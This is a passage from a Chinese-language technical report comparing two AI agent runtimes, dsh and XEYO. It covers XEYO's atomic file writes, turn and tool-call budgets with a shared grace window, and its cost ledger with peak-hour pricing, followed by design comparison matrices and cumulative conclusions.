    data = b"\xff\xfe" + content.encode("utf-16-le")   # BOM 特殊处理
else:
    data = content.encode(write_encoding, errors="replace")
try:
    with open(tmp, "wb") as handle: handle.write(data)
    os.replace(tmp, path)
except OSError:
    try:
        if tmp.exists(): tmp.unlink()                  # Windows 目标被占用是常态，不留垃圾
    except OSError: pass
    raise
```

注释（`:403-405`）说明为什么不复用 `write_text_file`：*"绕过它的 line_endings 逻辑：换行形态由调用方在 content 里定稿，此处只做原子替换，禁止平台翻译。"*

###### 编辑应用：与 Read 同源的归一化（`:433-449`）

```python
# 与 Read 同源的归一化文本：模型的 old_string 来自 Read（CRLF→LF），
# 若按原始字节读盘，CRLF 文件的 old_string 永远匹配不上 → 假 conflict。
content, _endings, _enc = read_text_file(str(path))
```

**"读与写必须走同一个归一化"**——否则 CRLF 文件永远冲突。

###### journal 失败不阻断写（`:313-327`）

```python
# journal 只是审计：文件已成功落盘，记录失败不得让工具报错——
# 否则调用方 read_state 不更新，下一轮反而误报 modified-since-read。
# T28：但「假 ok」不可接受——显式记日志并把警示带回工具结果。
```

于是 `ApplyResult` 带 `journal_warning`，文案是事实陈述（`:324-327`）：*"本次写操作已落盘但未进入可回溯日志"*。

###### 对照提示

dsh 的文件写入走 fs seam（A-6 的 `fs/policy`），策略由 seam 提供、沙箱兜底；XEYO 的写入走 `WriteStore` 单点，**自己实现版本校验、原子性、审计**。XEYO 这条路径的设计密度更高（三道门 + 版本校验 + 语法增量），但那是因为它没有沙箱——**所有安全责任都在这一层**。而 AGENTS.md 记的另一件事是：这条通道**并非唯一**，`server/workspace_fs.py` 与后台 bash job 是绕开它的旁路。

---

##### B-12 预算与收尾窗口：多软上限共享一个 grace

###### 设计意图

`engine/budget.py:1-6` 先定义了度量单位：

```
一次 submit 内，一次 Turn = 一次模型 API 请求/响应周期。
每一次实际进入 Agent tool interface 的工具执行尝试 = 1 个 Tool Call。
同一 Turn 可以包含多个 Tool Call；Tool Call 不会自动增加 Turn。
```

`BudgetTracker` 的 docstring（`:102-112`）说明了核心机制：

> 任一软上限首次触发后建立共享的 `MAX_GRACE_TURNS` 模型 Turn 收尾窗口，只发送一次对应的临时提醒，不写入消息历史。两个上限不会各自再提供一组 grace Turn；用户中断、token 和 USD 预算仍然优先硬停止。

**"共享一个 grace 窗口"是关键**：如果每个上限各自给 3 轮，三个上限触发就是 9 轮。共享之后收尾窗口恒定。

###### 常量（`:19-34`）

| 常量 | 值 | 说明 |
|---|---|---|
| `DEFAULT_MAX_TURNS` | 256 | 模型 API 请求次数上限 |
| `DEFAULT_MAX_TOOL_CALLING` | 64 | 每回合进入工具接口的执行次数（**并发上限另由编排层信号量 10 控制**，`:20-23`） |
| `MAX_GRACE_TURNS` | 3 | 共享收尾窗口长度 |
| `MAX_TOOL_CAP_STREAK` | 2 | 连续顶满才算失控（见下） |

###### grace-cliff 修复（`:26-30`, `:289-300`）

注释是这次修复的完整记录：

```
工具态共享收尾窗口的触发：先前只要单轮爆发(一个大并行批次)达到单轮工具
配额就立刻开启 3 轮倒计时，会把整个 submit 的剩余轮次烧光(grace-cliff)。
现改为"连续 MAX_TOOL_CAP_STREAK 轮持续顶满/超出单轮配额"才进入收尾，单轮
爆发只拒绝溢出调用、不影响整轮窗口；单轮配额依然按每回合重置。
```

实现：

```python
if self._turn_hit_tool_cap:
    self.tool_cap_streak += 1
else:
    self.tool_cap_streak = 0
self._turn_hit_tool_cap = False
self.turn_count += 1
self.current_turn_tool_calls = 0
if not self.grace_started and self.tool_cap_streak >= MAX_TOOL_CAP_STREAK:
    self._start_grace("max_tool_calling")
```

**"单轮爆发不是失控，连续两轮才是"** —— 这是把"失控"定义从"瞬时强度"改成"持续性"。

###### 墙钟与 USD 水位（`:148-249`）

两条正交的时间/成本感知：

| 机制 | 阈值 | 默认 |
|---|---|---|
| 墙钟 | 80% / 90% 播报；100% + `wall_hard_stop` 才进 grace | `wall_hard_stop` 默认 False（`XEYO_WALL_HARD_STOP=1` 才武装，`:37-44`） |
| USD | 80% / 90% 播报 | `usd_limit` 为正才武装 |

`:171-173` 注释：*"产品会话即使设了死线（仅时间感播报）也不会被引擎硬停；只有宿主显式要求'到点收尾'（评测适配器/用户时间预算）才生效。"*

播报文案刻意是纯事实（`:192-193`）：*"时间预算已用 {label}，剩余约 {remain_min} 分钟。"* + 注释 *"C6 裁决：预算信息纯事实，不加行动指令。"*

###### 硬停返回（`:267-279`）

```python
if self.grace_started:
    if self.turn_count >= self.max_turns: self._queue_notice("max_turns")
    if self.grace_turns_used < MAX_GRACE_TURNS: return True
    self._hard_stop_reason = self.grace_reason or "max_turns"
    return False
if self.turn_count < self.max_turns: return True
self._start_grace("max_turns")
return True
```

注意 `prepare_next_turn` **不增加 Turn 计数**（`:253-255`：*"该方法不增加 Turn。只有真正调用 `begin_turn` 时才会计入"*）——判定与计数分离，避免"判定失败也消耗轮次"。

###### 对照提示

dsh 侧有 workspace 级的 request budget（用于 compaction/spill 的 token 预算），但**没有"回合/工具调用/墙钟/USD"这类会话级执行预算**。XEYO 这套机制的存在理由很直接：**要能对一次长任务给出"什么时候该收尾"的确定性判定**，并且这个判定必须是引擎侧、不依赖模型自觉。

---

##### B-13 成本账本：按真实厂商计价 + 请求级归因

###### 设计意图

`usage/pricing.py:1-9` 的 docstring 记录了口径与两个易错点：

```
按厂商 / 模型估算消费金额（人民币）。

DeepSeek V4 官方价（2026-08-17 起，元 / 百万 token）：
  高峰 09:00–12:00、14:00–18:00（北京时间）；空闲 = 高峰 × 1/2。
  flash 空闲 命中 0.05 / 未命中 1.5 / 输出 4.5；高峰 0.10 / 3.0 / 9.0
  pro   空闲 命中 0.15 / 未命中 4.5 / 输出 13.5；高峰 0.30 / 9.0 / 27.0
```

数据表（`:26-29`）：`_DEEPSEEK = {"flash": ((0.05,1.5,4.5),(0.10,3.0,9.0)), "pro": (...)}` —— 外层是低峰/高峰两档，内层是 `(cache_hit, cache_miss, output)`。

峰谷配置（`:51-58`）可用 `XEYO_TIME_TIERS_JSON` 整体覆盖，注释说明理由（`:49`）：*"厂商改窗口或折扣不用发版"*。

###### 账本事件（`usage/ledger.py:99-130`）

字段分两段：**基础段**（每次都写）与 **schema v2 归因段**（仅 `request_id` 非空时写）。

基础段：

| 字段 | 说明 |
|---|---|
| `ts` / `day` | 时间戳 + 北京时区日（跨天聚合用） |
| `provider` | **接入通道**（deepseek/openai preset），保持"通道"语义 |
| `vendor` | **模型真实厂商**（`canonical_vendor`） |
| `model` / `session_id` / `key_fp` | 定位 |
| `prompt_tokens` / `completion_tokens` / `cache_hit` / `cache_miss` / `output` / `tokens` | 四桶 + 合计 |
| `cost_cny` / `cost_source` | 金额 + 来源（`api` 或 `estimate`） |

归因段（`:116-129`）：`request_id` / `attempt` / `kind` / `cache_write` / `reasoning_tokens`。

`provider` 与 `vendor` 分离的理由写在 `:63-64`：*"统计 / 计价 / 分组一律按 vendor —— 修 P0-1（provider 与模型错位导致套错价目与分组错乱）"*。

###### 记账纪律（`:66-76`，注释原文）

```
对齐 DeepSeek Harness 记账纪律（v4 设计，S2/S4）：
- ``request_id``：逻辑模型调用唯一 id（engine 在每个请求前生成，跨 attempt 不变）。
  **只在 request_id 非空时**才把 request_id/attempt/kind 写进行——其余调用点
  （CLI/评测/无 meta 场景）保持旧行结构，零扰动。
- ``attempt``：同一逻辑调用的第几次尝试（dsh S4：重试 attempt 各自入账——
  provider 对每次 HTTP 请求独立计费，死 attempt 若真的烧了 token 就该留下）。
- ``kind``：回合类型。``turn`` 主循环；``compact_summary`` C2 LLM 摘要旁路
  （dsh D-3 教训：压缩走模型的调用必须可归因、不得静默消失）。
- 每个 ``stream()`` 内的双写防御由模型适配器 ``_usage_recorded_this_stream``
  布尔完成（同一次尝试只记一次 = dsh S2 的流内单结算）。
```

**这段注释是罕见的"跨项目对齐"痕迹**：XEYO 明确引用了 dsh 的 S2/S4/D-3 条目来校准自己的记账纪律。这跟前四轮"两端对着干"的印象不同——在成本记账这一块，XEYO 主动向 dsh 学了两条（重试各自入账、压缩调用可归因）。

###### 记账优先链（`:89-98`）

```python
api_cost = official_cost_cny(usage)
if api_cost is not None:
    cost_cny = api_cost; cost_source = "api"        # API 返回金额直接采用
else:
    cost_cny = estimate_cny(provider=vendor, model=model, usage=usage, ts=now)
    cost_source = "estimate"                        # 本地价表估算
```

**"API 说多少就是多少"优先于本地估算** —— 本地价表只在 API 不给金额时兜底。这解释了 `:44-46` 那条边界注释：*"usage 自带金额直接采用，不经过这里"*。

###### 容量与聚合

`_MAX_LINES = 80_000`（`:16`）——事件文件上限，超出后由聚合侧处理。追加实现（`:133-139`）用 `_lock` + append，不做 fsync（成本记账可容忍丢最后一行）。

###### 对照提示

dsh 侧有 token 计量与 compaction 的影子计价（A-9 `region.ts:340-364`），但**没有成本金额统计、没有峰谷价、没有请求级归因、没有四桶分离**。XEYO 这套（pricing/ledger/attribution 三文件 + 8 万行上限 + 峰谷可配置）是**运营性资产**：它服务于"这个产品跑起来有多贵"这个只有产品方关心的问题。**注意 `usage/pricing.py` 当前仍是 2026-08-17 价表，尚未同步新价**（第四轮已记，本轮维持）。

---

#### Part C — 机制对照矩阵

##### C-1 同构问题：两端在解同一道题，答案不同

下面六组机制**解的其实是同一道题**，但两端的答案在结构层就分岔了。这是本轮最核心的产出——前面四轮比的是"有什么 / 怎么设计 / 什么字段"，本轮比的是"同一个问题两边怎么解"。

###### ① 崩溃后的尾巴怎么办

| | dsh（A-2） | XEYO（B-8） |
|---|---|---|
| 机制名 | `interruptedTurnClosers(events)` | `mark_crashed_rewinds` + `_reconcile_orphan_surface_markers` |
| 处理对象 | 会话日志的**对话结构** | 工作区文件 + transcript 的**双向一致** |
| 手段 | **合成闭合事件**（补一个合法的 turn 结尾） | **状态提升 + 事件合成**（in-flight → `recovery_required`；marker 无事件 → 补 `transcript_committed`） |
| 崩溃语义 | "崩溃尾不算数据损坏" | "崩溃最坏结果 = 这件事没发生过"（v3.1 marker 化后） |
| 用户可见 | 不需要（自动修复） | 需要（`recovery_required` 要用户选 retry/abandon） |

**分歧点**：dsh 自动补齐就够了，因为它的"坏尾"只影响模型上下文；XEYO 的"坏尾"可能意味着磁盘处于中间态，引擎**不能替用户决定**是重试还是放弃。

###### ② 易变内容如何进上下文而不破坏缓存

| | dsh（A-5） | XEYO（B-1/B-2） |
|---|---|---|
| 载体 | 可替换的 **user 消息** | 伪造的 **assistant(tool_use) → user(tool_result) 对** |
| 变更语义 | **差异才发 + 被替换即撤销** | **每轮重建 + 尾插只增** |
| 保护缓存的机制 | 内容替换而非追加 | 尾部追加不改前缀字节 |
| 结构约束 | seam 插件 + 类型系统 | 登记表 20 块 + 机器执法测试 |
| 预算 | 无显式分块预算 | 三层预算 6000/2500 + 分类（directive/event/inventory） |

**分歧点**：dsh 的选择要求"能被替换"（所以放 user 角色），XEYO 的选择要求"不可能被误认为用户"（所以放 tool_result）。**dsh 优化的是缓存与去重，XEYO 优化的是说话人隔离。**

###### ③ 变更如何变得可逆

| | dsh（A-1/A-9/A-11） | XEYO（B-7/B-8/B-9/B-10/B-11） |
|---|---|---|
| 可逆对象 | **对话**（surface 投影 + 压缩事务 + fork） | **工作区文件**（内容寻址 + orphan + 影子 git） |
| 存储 | 会话日志（事件溯源） | SHA-256 blob 库 + JSONL journal + `revision` 树 |
| 回溯实现 | 换一个 surface 投影（不删日志） | 从目标 revision 开新分支（`truncate_to` 不删旧记录） |
| 粒度 | 事件级 | 文件级（before/after 双快照） |
| 前置校验 | 无（投影天然一致） | simulated 状态机逐 op 校验（`_check_file_preconditions`） |
| 回收 | 压缩 + spill | 可达性 GC（三重默认关） |

**分歧点**：这是两端**能力覆盖最不对称**的一组。dsh 能做"逐字重建模型当时看到什么"（A-3），XEYO 能做"把磁盘恢复到某个时刻"。**前者是研究/审计能力，后者是产品/安全能力。**

###### ④ 授权如何既可用又不越界

| | dsh（A-6 审批） | XEYO（B-5/B-6） |
|---|---|---|
| 授予值 | 封闭四值，唯一授予 = `allowed-once` | 三态（allow/deny/remind）+ **可复用 grant** |
| 复用 | **不支持** | 指纹 v2，身份/参数分离 |
| 超时 | 单档 | **风险分级**（180s / 60s / 不超时） |
| 无审批方 | `unavailable`（fail-closed） | `UNAVAILABLE_COPY`（超时按拒绝） |
| 模型可见 | 审批策略**不进 transcript**（保缓存） | `runtime_mode_snapshot` 块**告诉模型**当前模式 |

**分歧点**：dsh 把"过度授权"当作必须结构上排除的风险；XEYO 把"确认频率"当作可调的产品参数。**两端的失败模式选择相反**（见 B-6 对照）。

###### ⑤ 执行隔离在哪里

| | dsh（A-8） | XEYO（B-3/B-4/B-11） |
|---|---|---|
| 机制 | `ctx.sandbox.confine(argv, policy)`，4 平台后端 | 权限链 11 级 + Bash 18 条黑名单 + `WriteStore` 三门 |
| 强制力 | **内核**（bwrap/Landlock/Seatbelt/Windows-ACL） | **文本分析 + 路径校验** |
| 失败姿态 | fail-closed（无后端拒绝运行） | 没有沙箱，只有"没有 jail 就不给全权"（`bash:allow` 自动降回 `default`，`:874-881`） |
| 可信度前提 | "内核不骗我" | "我的正则足够全" |

**分歧点**：这是全项目最硬的一处差距，第五轮结论与第三轮一致。XEYO 的 `_evaluate_bash` 有 11 级分支、`bash_policy` 有 18 条正则与密钥拦截、`WriteStore` 有内容哈希校验——**这些工作量加起来仍然不是隔离**，它们只是让"误用"变难。

###### ⑥ 什么时候该收尾

| | dsh | XEYO（B-12） |
|---|---|---|
| 回合/工具上限 | 无（靠 compaction 与 spill 处理上下文压力） | `max_turns=256` / `max_tool_calling=64` |
| 收尾窗口 | — | 共享 grace 3 轮 + `MAX_TOOL_CAP_STREAK=2` 防 grace-cliff |
| 时间/成本感知 | — | 墙钟 80/90% + USD 80/90% 纯事实播报 |
| 硬停 | — | `wall_hard_stop` 显式武装才生效 |

**分歧点**：dsh 不设执行预算（它的假设是"会话可以一直开下去，压力交给上下文管理"），XEYO 设（它的假设是"一次 submit 必须有确定的结束"）。这直接来自两端的应用形态差异——**dsh 是常驻会话运行时，XEYO 是产品级单次任务**。

##### C-2 单侧独有机制

###### dsh 独有（本轮 Part A 里 XEYO 无对应物的）

| 机制 | 为什么 XEYO 做不了（不是不想） |
|---|---|
| A-1 事件溯源 + `surfaceOp` 投影 | XEYO 的 transcript 是**直出**的，没有投影层——加投影层等于重写会话层 |
| A-2 `interruptedTurnClosers` | XEYO 的崩溃恢复对象是文件（B-8），不是对话结构 |
| A-3 请求纪元快照（`request/header`） | XEYO 没有"逐次请求记账"的概念，只有消息历史 |
| A-8 沙箱 confine | 无内核级隔离原语可用（Windows 侧只有 Job Object，且是资源限额非隔离） |
| A-9 压缩事务（括号事务 + 工具配对平衡） | XEYO 无压缩层（C0/C1/C2 是截断，不是事务） |
| A-10 JSONL 写后缓冲 + 撕裂尾修复 + 跨进程租约 | XEYO 的 session JSONL 是**直接追加**，无缓冲/租约 |
| A-11 会话级 fork | XEYO 有 revision 树（B-7），但没有会话 ID 级 fork |

###### XEYO 独有（本轮 Part B 里 dsh 无对应物的）

| 机制 | 为什么 dsh 不需要 |
|---|---|
| B-1 T_now 分类预算管线 | dsh 的 runtime-context 是 seam 插件，不需要"20 块 + 硬顶 + 登记表"这种纪律设施 |
| B-2 伪造 tool 对声道 | dsh 用可替换 user 消息就解决了，不需要结构隔离 |
| B-3 权限 11 级链 | dsh 有沙箱兜底，策略可以粗 |
| B-4 Bash 18 条黑名单 + 前缀规则引擎 | 同上 |
| B-5 可复用授权指纹 v2 | dsh 明确不给复用 |
| B-6 风险分级 TTL + 审计配对 | dsh 单档 TTL、无审计配对 |
| B-7/B-8/B-9/B-10/B-11 工作区可逆性五件套 | dsh 的可逆性作用在对话侧 |
| B-12 会话执行预算 + 收尾窗口 | dsh 无执行预算概念 |
| B-13 成本账本 + 峰谷计价 | dsh 无成本统计（这是产品运营需求） |

##### C-3 一个值得单独说的反向事实

第四轮与前三轮的叙事是"两端互为镜像、各走各路"。本轮在 B-13 里发现了**一处例外**：`usage/ledger.py:66-76` 的注释明确写着 *"对齐 DeepSeek Harness 记账纪律（v4 设计，S2/S4）"*，并逐条引用了 dsh 的 S2（流内单结算）、S4（重试 attempt 各自入账）、D-3（压缩走模型的调用必须可归因）。

**也就是说：XEYO 在成本记账这一块主动向 dsh 抄了作业，并且把出处写进了注释。** 这说明两端并非"互不相干"，至少在一个方向上有明确的知识流动。

对照来看，XEYO 在注释里引用 dsh 的地方还有几处（记忆里 09-08 至 09-10 的整改中也有引用），但**这次是本轮直接读到的、最明确的一条**。这个事实让"两端关系"的结论需要修正：不是"完全独立演化"，而是**"架构独立、局部借鉴"**。

##### C-4 五轮累计结论

| 轮次 | 文件 | 行数 | 视角 | 主要产出 |
|---|---|---|---|---|
| 一 | `XEYO-vs-DeepSeekHarness-全量对比.md` | 605 | 功能面 | 有什么 / 没什么 |
| 二 | `...设计级对比-第二轮.md` | 1307 | 设计面 | 32 系统，抽象与取舍 |
| 三 | `...实现级对比-第三轮.md` | 2246 | 实现面 | 函数签名 / 算法步骤 / 常量 |
| 四 | `...逐字段级对比-第四轮.md` | 1505 | 枚举面 | 每个类型每字段每键名 |
| 五 | `...机制设计说明-第五轮.md` | 本文件 | **机制面** | 同一问题两端的解法与不变量 |

**五轮读下来，"两端差距"的最终表述**：

1. **dsh 强在"层"**：事件溯源、沙箱、类型化协议、组合层（profile/bundle/preset）、质量门——这五处是**可复用的架构层**，换一个产品也能用。
2. **XEYO 强在"纪律与运营"**：注意力治理（T_now 管线 + 登记表执法）、工作区可逆性（rewind 五件套）、权限细化（11 级链 + 指纹 v2）、成本治理（峰谷 + 账本 + 归因）——这四块是**把一件事做到底的产品能力**，换一个产品不好复用。
3. **两端最根本的分岔是"可信边界放在哪"**：dsh 放在内核（沙箱）与类型系统；XEYO 放在文本分析与测试断言。这决定了 dsh 的策略可以粗而 XEYO 必须细。

**如果要给 XEYO 排一个借鉴优先级**（第五轮视角，与第三轮结论一致但理由更具体）：

1. **沙箱**（A-8）——不是"加一个功能"，而是把可信边界从"正则"换到"内核"。这会连带简化 B-3/B-4 两层（策略可以变粗）。
2. **事件溯源会话日志**（A-1 + A-3）——让"模型当时看到什么"可逐字重建。当前 XEYO 的 transcript 直出是多个机制（投影一致性、缓存保护、审计）难以统一的根因。
3. **压缩事务**（A-9）——XEYO 的 C0/C1/C2 是截断，遇到"截断边界切断工具配对"这类问题只能靠事后修补；事务化是结构性解法。
4. **JSONL 写入的撕裂尾与租约**（A-10）——单点收益不大但成本最低，可以单独做。

##### C-5 取证边界（本轮）

- **dsh 侧**：A-1…A-11 全部基于**直接读源码**（`Read` 精读 + `sed/grep` 切片），引用行号均为本机 `D:\lea\dsh-src`（commit `d347e70`）实测。A-11 中 `SessionEventMap` 的 51 个事件名以 Python 花括号计数法复核（修正了 awk 在该机器上的静默失败）。
- **XEYO 侧**：B-1…B-13 全部基于**直接读源码**，引用行号基于 `D:\lea\XenYon code`。`rewind/` 12 文件 5343 行中，`models/snapshot/journal/revision/locks/context` 六文件**全文精读**；`hotpath/service/index/blob_gc` 四文件**按函数切片精读**（未逐行读完全部 1800 + 1024 行）。
- **未逐行读的**：`rewind/service.py` 的 `_operation_details` 与 `_journal_ops_for_target_message`（约 130 行）、`hotpath.py` 的 `_restore_checkpoint_files`（约 200 行）、`engine/budget.py` 的 `to_dict/from_dict`（约 100 行）。这些是"实现的执行细节"，不影响本轮"机制设计"层面的结论。
- **数字口径**：本文件所有数字（常量值、行号、字段数）均为本轮实测；若与前四轮冲突，**以第四轮（逐字段级）与本轮为准**——前两轮部分依赖子代理转述。
- **本轮的自我更正**：B-8 的 `hotpath.py:1-13` 文件头注释描述的是 **v3.0 旧合同**（orphan → 原子重写 transcript），而 `:427-430` 的实际代码是 **v3.1 的 marker 方案**（transcript 永不重写）。**注释与代码不一致，以代码为准**——这一点在第一至第四轮均未发现，是第五轮"读机制而非读清单"的直接收益。

---

*第五轮报告完。五份报告可并列查阅：功能面（605 行）→ 设计面（1307 行）→ 实现面（2246 行）→ 逐字段级（1505 行）→ 机制设计说明（本文件）。*


# 卷四 · 差异总表与累计结论

> 各轮的差异总表与结论段，集中排布便于纵向对比口径变化。

## 4.1 第一轮 · 差异总表与结论

> 来源：**R1 功能面·全量对比** · 原节「28. 差异总表」（源 L522–605）

##### 28. 差异总表

###### 28.1 dsh 有、XEYO 完全没有

1. **OS 级沙箱**（bwrap/Landlock/Seatbelt/Windows-ACL + E2B），fail-closed
2. **PTY 持久终端**（`ctx.terminals` + 6 个 terminal 工具 + 持久 bash/pwsh）
3. **代码执行 seam**（`ctx.codeRuntime`：worker-thread/process/container）+ **PTC 模式**（`run_code`）
4. **工作流脚本引擎**（`workflow` 工具 + worker-thread）与 `ralph`
5. **Webhook 入口**（`ctx.webhookRuntime` + GitHub 适配器）
6. **定时任务可用**（`schedule_*` 三工具）
7. **自修改**（7 个 `cordis_*` 工具，模型定义/挂载/停用自己的插件）
8. **会话历史自查询工具**（5 个 session-query 工具）
9. **LSP 能力缝**（`ctx.lsp` + `lsp-stdio` + `lsp` 工具）
10. **事件溯源会话日志**（`SessionEventMap` + `deriveMessages` + surface + 代际迁移）
11. **录制会话快照测试** + **浏览器快照 e2e**
12. **per-file 100% 覆盖率门**
13. **Typert 类型化 RPC**
14. **TS/Python 双 SDK** + **ACP 服务器**
15. **多 provider 子代理**（fork/codex/claude-code/acp）
16. **多厂商 LLM 适配器**（`llm-pi-ai`）
17. **插槽化插件 UI** + Trajectory 面板 + HMR + i18n
18. **Anonymous identity 与 OTel 遥测**
19. **双语言（中/英）文档体系 + Agent Note 制度**
20. **Profile/Bundle/Patch 三层组合**与 5 个应用形态
21. **`ctx.invariants` 包级不变式注册表**
22. **`fs-observation-policy`（读前写强制）**
23. **spill store**（超长文本落盘 + locator）
24. **`deepseek-llm-api-wire-extensions`**（请求侧扩展字段与归因头）

###### 28.2 XEYO 有、dsh 完全没有

1. **工作区 rewind**（v2/v3，崩溃恢复顺序 orphan→fsync→原子替换 transcript→恢复工作区）
2. **跨会话长期记忆子系统**（`memory/` 48 文件 + `Memory` 工具 + 离线 simulator）
3. **预算/死线机制**（`budget.py`、`runtime_budget`/`budget_mirror`/`wrap_up`、forced wrap-up 收窗）
4. **T_now 注入管线 + 块登记表硬顶**（21 上限 + 逐条理由 + 机器执法）
5. **`env_channel` 伪造 tool 对声道**（说话人混淆根治）
6. **桌面原生壳**（Tauri：进程守护、`python_exe_usable` 真探测、`BACKEND_SPAWN_ERROR` 真实原因回显、自包含 slim venv 构建与断言）
7. **桌面 UI 控制工具**（`XeyoUI`）、**Screenshot**、**桌宠/桌面岛**
8. **微信通道**（`channels/` 33 文件：filehelper/ilink）
9. **`SendToWeChat`**、**`NotebookEdit`**、**`Git`（只读工具化）**、**`Diagnostics`**
10. **成本口径治理**（分时段峰谷价、`USD_CNY`、ledger/attribution/vendor/combine、多代理成本度量）
11. **斜杠命令 SSOT + 生成式 manifest 进门禁**（35 条命令）
12. **TUI（Ink）第二客户端**
13. **中文优先文档与应试性审查尺子**（R1–R4 四条的自我约束框架）
14. **`bash_routing` 透明路由**（纯读命令自动改用专用工具，带 `[routed: …]` 信号）
15. **多会话 peer 活动感知**（`peer_presence`/`file_conflict` 块 + 工作区索引）
16. **`workspace_fs` 只读旁路**与 `XEYO_WORKSPACE_FS_WRITABLE` 开关

###### 28.3 同名不同实现（易混淆）

| 能力 | XEYO 做法 | dsh 做法 |
|---|---|---|
| 权限 | 工具级 ASK/ALLOW/DENY + grant 指纹 | 沙箱模式 × 审批策略两旋钮，无 DENY 词 |
| 计划模式 | 斜杠 `/plan` + 服务端审批接口 | `exit_plan_mode` 工具 + `plan/mode` 持久事件 |
| 子代理 | 单实现复用 query_loop，侧链 JSONL | seam + 5 种 provider，委托边界强制 `never` 审批 |
| 技能 | 单目录 + T_now 预注入 | 分层注册表 + `<skill_content>` 包装 |
| MCP | `Mcp` 网关工具 | 同名 `Mcp` 网关工具（独立演化出同一设计） |
| 后台任务 | `job_*` 三工具 | `job_*` 三工具（kind-agnostic 统一控制器） |
| 会话删除 | 归档门槛 409 `archived_required` | 代际不可删（提交代际永不删除） |
| 工具面冻结 | `_schemas_cache` 冻结 | 会话起点快照冻结 |
| 断线恢复 | cursor 重放 current turn events | 日志 seq 重放 |

---

##### 29. 结论

**1. 两者是不同物种。** XEYO 是「一个引擎 + 一套注意力纪律 + 一个桌面产品」；dsh 是「一个运行时 + 一套组合理论 + 五个应用形态」。XEYO 把复杂度压在**信息正确性**上（模型看到什么、看不到什么、为什么）；dsh 把复杂度压在**结构可替换性**上（任何一块能不能被换掉）。

**2. dsh 在"工程完备度"上全面领先。** 沙箱、PTY、LSP、工作流、webhook、定时、事件溯源日志、快照测试、100% 覆盖门、双 SDK、ACP、i18n 双语、生成式文档——这些都是 XEYO 没有的**基础设施级**能力。差距不是"差几个功能"，而是"缺的是同一层东西"。

**3. XEYO 在"注意力治理"与"成本治理"上领先。** T_now 管线 + 21 硬顶 + 逐块理由 + 机器执法，dsh 没有等价物（dsh 只有"model-visible ⟺ logged"这一条**可审计性**约束，不约束内容性质）。预算/死线机制、峰谷定价口径、rewind 工作区回滚、跨会话记忆，dsh 也都没有。

**4. 最值得 XEYO 借鉴的三件事**（按性价比排序）：
- **事件溯源会话日志**：把 transcript 从"消息级"升到"事件级"，并把 `request/header` 入日志——这是"模型到底看到过什么"唯一可逐字重建的方案，也是 fork/resume/telemetry/迁移的公共底座。XEYO 现在靠投影函数重算，无法证明。
- **沙箱执行层**：`ctx.sandbox.confine(argv, policy)` + fail-closed。XEYO 目前只有"工具调用前判定 + destructive_guard 关键词"，一旦落到 Bash 就没有第二道防线。
- **能力缝三角色 + 命名事件瀑布**：不需要照搬 Cordis，但把 `query_loop` 里的 4 个点位（pre-step / request / llm stream / 工具三段）改成命名事件，就能让今天的 guard 从"改引擎"变成"挂插件"。

**5. 最值得 dsh 借鉴的一件事**：**T_now 式的注入治理**（白名单 + 硬顶 + 逐条存在理由 + 机器执法）。dsh 的插件自由是双刃剑——谁的插件都能往上下文塞东西，而它只有"可重建"这一条底线，没有"这条内容该不该出现在注意力里"的门。

**6. 一个共同的收敛点。** 两边独立演化出了相同的两条结论：**①工具面会话内冻结（保 KV 前缀缓存）；②会话内新增工具只能走网关工具。** 这说明这两条不是实现选择，而是长会话 Agent 的结构性必然。

---

*取证边界：本文覆盖 `D:\lea\dsh-src` 全部 9080 个受控文件的模块级通读（其中核心包逐文件读；前端 38 个 `ui-*` 包按入口/slot/contract 读，组件内部实现未逐行读）与 XEYO `python/`(1141 文件) + `gui/src`(391 文件) + `tui/`(16 文件) + `gui/src-tauri`(3 文件) 的模块级通读。凡标"未见"处均为可检索面穷举后未命中。*

## 4.2 第二轮 · 设计层差异总表与结论

> 来源：**R2 设计面·设计级对比** · 原节「31. 设计层差异总表」（源 L1212–1307）

##### 31. 设计层差异总表

###### 31.1 同一问题、两种解法（设计取向对照）

| 问题 | dsh 的解法 | XEYO 的解法 | 谁赢 |
|---|---|---|---|
| 长会话工具面变化 | 不冻结，每步派生；一致性交给类型化 RPC + 事件日志 | **冻结** `_schemas_cache`；新增只能经 `Mcp` 网关 | 平（代价各异） |
| KV 前缀稳定 | 结构副产品（追加式日志）+ provider 库声明 cache 能力 | 显式政策（左段极简 + `frozen_until` 游标） | XEYO 更自觉 |
| 上下文里能放什么 | 无门（插件自由），只要求"可见即可重建" | **登记表 + 硬顶 21 + 逐条理由 + 4 条测试** | XEYO 更严 |
| 权限的本质 | 沙箱模式 × 审批策略（≈隔离强度） | 工具级 ASK/ALLOW/DENY + grant 指纹 | 不可比（正交） |
| 隔离 | 内核级四后端 + 云沙箱，fail-closed | 无（仅 Job Object 资源限额 + 关键词启发式） | **dsh 完胜** |
| 模型历史真相 | 事件溯源，`request/header` 入日志，可逐字重建 | 消息级 transcript，靠投影函数重算 | **dsh 完胜** |
| 成本可控 | 无 | 峰谷价 + 账本 + 归因 + 四重预算 + 收尾窗 | **XEYO 完胜** |
| 失败姿态 | fail-loud（配置错就炸）+ fail-closed（沙箱不可用即拒跑） | keep-last-good + 静默降级 + 执行层静默报错 | 取向不同 |
| 扩展能力 | 69 seam / 255 包 / 运行期挂载 | 3 个固定扩展面 / 编译期枚举 | **dsh 完胜** |
| 对外可编程 | TS/Py 双 SDK + ACP + 5 profile | 只有 CLI/TUI/HTTP attach | **dsh 完胜** |
| 质量门 | 覆盖率 100% + 快照回放 + 真 API + 40 verify | pytest(非 live) + manifest + typecheck + vitest | **dsh 完胜** |
| 桌面交付 | 无壳（npx） | Tauri 壳 + 自包含 venv 断言 + 进程守护 | **XEYO 完胜** |

###### 31.2 dsh 有、XEYO 完全没有（设计层，去重后 14 项）

1. **能力缝三角色 + 69 个 seam**（Service Definition / Provider / Consumer）
2. **注册即 effect**（disposer 自动回收）
3. **命名事件瀑布**（4 个工具管线拦截点 + 3 个 agent 阶段 waterfall）
4. **OS 级沙箱四后端 + E2B**，`confine(argv, policy)` 抽象，fail-closed
5. **事件溯源会话日志 + `request/header` 入日志 + 代际迁移链**（`SESSION_FORMAT_VERSION=2`）
6. **PTY 持久终端**（6 工具）+ Shell seam（`run`/`start`/`readOutput` 语义分离）
7. **代码运行时 seam + PTC（`run_code`）**
8. **LSP seam（四操作收窄）**
9. **工作流脚本引擎 + `ralph`**、**Webhook 入口**、**时间触发定时任务**
10. **自修改工具**（7 个 `cordis_*`）
11. **类型化 RPC（Typert）+ 18 事件白名单**
12. **SDK / ACP / profile 组合（Profile→Bundle→Patch→Preset 四层）**
13. **per-file 100% 覆盖率门 + 快照回放 + 浏览器 PR 门 + 40 verify**
